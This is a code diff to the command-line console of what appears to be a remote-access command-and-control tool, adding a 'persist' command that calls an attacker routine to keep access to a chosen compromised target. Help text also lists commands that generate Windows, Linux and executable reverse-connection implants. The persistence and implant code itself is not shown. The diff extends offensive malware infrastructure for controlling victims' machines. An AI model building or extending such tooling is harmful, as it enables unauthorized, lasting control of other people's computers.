@@ -27,7 +27,7 @@ class Cli:
     
     """
     List of supported commands:
-    sessions, cd, ls, listen, help, exit
+    sessions, cd, ls, listen, persist, help, exit
     """
     def handle_commands(self, server, attacker):
         if server.is_listening:
@@ -137,6 +137,25 @@ class Cli:
                 print("Missing argument. Usage : 'cd <session_number>'\n")
             except ValueError:
                 print("Value provided is not an integer.\n")
+        # "persist" command
+        elif command == "persist":
+            if len(server.list_of_targets) == 0:
+                print("No target connected.\n")
+            else:
+                print("Usage : persist <target_number>")
+                print("Use 'sessions -l' to list targets.\n")
+        # "persist <num>" command
+        elif command.split()[0] == "persist":
+            try:
+                index_to_persist = int(command.split()[1]) - 1
+                if 0 <= index_to_persist < len(server.list_of_targets):
+                    attacker.persist(server, index_to_persist)
+                else:
+                    print("Out of bound value provided. Use 'sessions -l' or 'ls' to list sessions.\n")
+            except IndexError:
+                print("Missing argument. Usage : 'persist <session_number>'\n")
+            except ValueError:
+                print("Value provided is not an integer.\n")
         # "exit"
         elif command == "exit":
             server.close_all_connections()
@@ -147,6 +166,7 @@ class Cli:
             print("    winplant                generate a Windows reverse conncetion")
             print("    linplant                generate a Linux reverse conncetion")
             print("    exeplant                generate a executable reverse conncetion for Windows\n")
+            print("    persist                 make your connection to a target persistent")
             print("Enter 'exit' to close all connections and leave.")
             print("")
         # unknown commands
